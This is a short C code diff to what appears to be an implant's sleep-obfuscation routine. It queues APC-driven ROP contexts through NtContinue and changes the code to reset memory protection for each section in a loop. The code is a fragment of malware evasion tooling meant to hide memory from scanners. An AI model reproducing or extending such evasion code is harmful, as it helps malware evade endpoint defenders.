@@ -437,10 +437,12 @@ VOID FoliageObf(
                         if (!NT_SUCCESS(
                                 SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopMemDec, FALSE, NULL)))
                             goto Leave;
-                        if (!NT_SUCCESS(
-                                SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopSetMemRx, FALSE,
-                                                    NULL)))
-                            goto Leave;
+                        for (int i = 0; i < NumberOfSections; i++) {
+                            if (!NT_SUCCESS(
+                                    SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), &(RopMemProtect[i]),
+                                                        FALSE, NULL)))
+                                goto Leave;
+                        }
                         if (!NT_SUCCESS(
                                 SysNtQueueApcThread(hThread, C_PTR(Instance.Win32.NtContinue), RopSetCtx2, FALSE,
                                                     NULL)))
